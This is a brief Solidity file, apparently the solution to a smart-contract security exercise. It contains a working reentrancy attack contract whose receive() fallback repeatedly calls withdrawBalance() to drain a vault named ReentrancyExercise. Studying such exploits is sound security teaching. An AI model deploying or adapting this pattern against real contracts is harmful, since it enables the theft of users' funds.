// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;
import {ReentrancyExercise} from "../src/ReentrancyExercise.sol";


contract ReentrancyAttack {
    ReentrancyExercise public vault ;
    constructor(address _vault)
    {
        vault = ReentrancyExercise(_vault);
    }
    function attack() public payable {
        vault.deposit{value:msg.value}();
        vault.withdrawBalance();
    }
    receive() external payable {
        if(address(vault).balance >=1 ether)
        {
            vault.withdrawBalance();
        }
    }
}
